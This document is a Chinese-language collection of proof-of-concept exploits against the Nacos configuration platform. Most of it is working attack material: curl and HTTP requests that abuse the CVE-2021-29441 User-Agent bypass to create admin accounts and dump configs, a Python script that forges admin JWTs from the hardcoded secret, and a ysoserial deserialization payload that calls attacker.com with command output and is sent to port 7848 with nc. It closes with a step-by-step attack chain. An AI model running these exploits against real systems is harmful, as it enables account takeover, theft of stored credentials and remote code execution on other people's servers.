# Nacos 漏洞 POC

## 系统简介

Nacos 是阿里巴巴开源的服务发现、配置管理和服务管理平台，广泛用于微服务架构中。

---

## CVE-2021-29441 — 认证绕过（User-Agent 伪造）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2021-29441 |
| CVSS | 9.8 (CRITICAL) |
| 漏洞类型 | 认证绕过（Authentication Bypass by Spoofing） |
| 认证要求 | 无需认证 |
| 影响版本 | Nacos < 1.4.1 |
| 修复版本 | 1.4.1 |

### 漏洞原理

`AuthFilter` 过滤器中硬编码了对特定 `User-Agent` 值的检查，用于内部服务器通信。当请求头 `User-Agent` 设置为 `Nacos-Server` 时，AuthFilter 认为这是内部请求并完全跳过认证检查。

攻击者可伪造此 User-Agent，直接访问所有管理 API 端点。

### POC — 创建管理员用户

```http
POST /nacos/v1/auth/users?username=attacker&password=attacker123 HTTP/1.1
Host: target:8848
User-Agent: Nacos-Server
Content-Length: 0
```

### POC — 列举所有用户

```http
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
Host: target:8848
User-Agent: Nacos-Server
```

### POC — 读取配置（可能含数据库密码等敏感信息）

```http
GET /nacos/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=10 HTTP/1.1
Host: target:8848
User-Agent: Nacos-Server
```

### curl 利用示例

```bash
# 创建新管理员账户
curl -X POST 'http://target:8848/nacos/v1/auth/users?username=attacker&password=attacker123' \
  -H 'User-Agent: Nacos-Server'

# 列举用户
curl 'http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' \
  -H 'User-Agent: Nacos-Server'

# 获取所有配置
curl 'http://target:8848/nacos/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=10' \
  -H 'User-Agent: Nacos-Server'
```

### 利用步骤

1. 确认目标 Nacos 版本 < 1.4.1
2. 使用 `User-Agent: Nacos-Server` 头发送任意管理 API 请求
3. 创建新管理员账户，或直接读取配置文件（含数据库凭据、API 密钥等）
4. 使用新账户登录 Nacos 控制台进行进一步渗透

### 可利用的能力

- 创建/修改/删除用户账户
- 读取/修改所有服务配置
- 注册恶意服务
- 读取数据库连接字符串、API 密钥等敏感配置

---

## CVE-2021-29442 — Actuator 端点未认证信息泄露

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2021-29442 |
| CVSS | 7.5 (HIGH) |
| 漏洞类型 | 信息泄露 |
| 影响版本 | Nacos < 1.4.1 |

```bash
# 泄露内部环境变量和配置数据
curl 'http://target:8848/nacos/actuator/env'
curl 'http://target:8848/nacos/actuator/prometheus'
```

---

## JWT 密钥硬编码 — Token 伪造（CVSS 9.8）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| 漏洞类型 | JWT Token 伪造 |
| 影响版本 | Nacos < 2.2.0.1 |

Nacos 使用硬编码 JWT 密钥：

```
SecretKey012345678901234567890123456789012345678901234567890123456789
```

### 利用步骤

```python
import jwt
import time

# 伪造管理员 Token
payload = {
    "sub": "nacos",
    "exp": int(time.time()) + 86400,
    "roles": ["ROLE_ADMIN"]
}
secret = "SecretKey012345678901234567890123456789012345678901234567890123456789"
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

```bash
# 使用伪造 Token 访问管理 API
curl 'http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' \
  -H "Authorization: Bearer <forged_token>"
```

---

## Derby 数据库 RCE（需要管理员权限或配合认证绕过）

### 漏洞原理

Nacos 内嵌 Derby 数据库时，控制台暴露 SQL 执行端点。Derby 存储过程可加载 Java 类，实现 OS 命令执行。

```bash
# 读取配置（含数据库密码等）
curl 'http://target:8848/nacos/v1/cs/ops/derby?sql=select+*+from+config_info' \
  -H "Authorization: Bearer <admin_token>"

# 进一步利用 Derby 存储过程执行系统命令（RCE）
```

---

## Raft 协议反序列化 RCE（集群模式，端口 7848）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| 漏洞类型 | Java 反序列化 → RCE |
| 攻击向量 | 网络（Raft 端口 7848） |
| 认证要求 | 无需认证 |
| 影响版本 | Nacos 1.x 集群模式 |

```bash
# 使用 ysoserial 生成 payload
java -jar ysoserial.jar CommonsCollections6 "curl http://attacker.com/\$(id)" > payload.ser

# 发送到 Raft 端口（7848）
nc target 7848 < payload.ser
```

---

## Nacos 2.x — 访问控制漏洞

```bash
# Nacos 2.0.3 访问控制绕过（无需 User-Agent 技巧）
curl 'http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'
```

## 典型攻击链（在野利用）

1. 识别 Nacos 实例（端口 8848，路径 `/nacos/index.html`）
2. 尝试默认凭据 `nacos/nacos`
3. 若已修改默认密码：使用 CVE-2021-29441 User-Agent 绕过创建管理员账户
4. 或使用硬编码 JWT 密钥伪造管理员 Token
5. 以管理员权限读取所有命名空间配置（数据库密码、云密钥、API Token 等）
6. 如需 RCE：利用 Derby SQL 端点或 Raft 反序列化（集群模式）

### 参考资料

- [Vulhub CVE-2021-29441](https://github.com/vulhub/vulhub/tree/master/nacos/CVE-2021-29441)
- [NVD CVE-2021-29441](https://nvd.nist.gov/vuln/detail/CVE-2021-29441)
- [Tenable Plugin](https://www.tenable.com/plugins/nessus/154416)
- [Exploit-DB Nacos 2.0.3](https://www.exploit-db.com/exploits/51205)
- [Xray POC](https://github.com/chaitin/xray/blob/master/pocs/alibaba-nacos-v1-auth-bypass.yml)
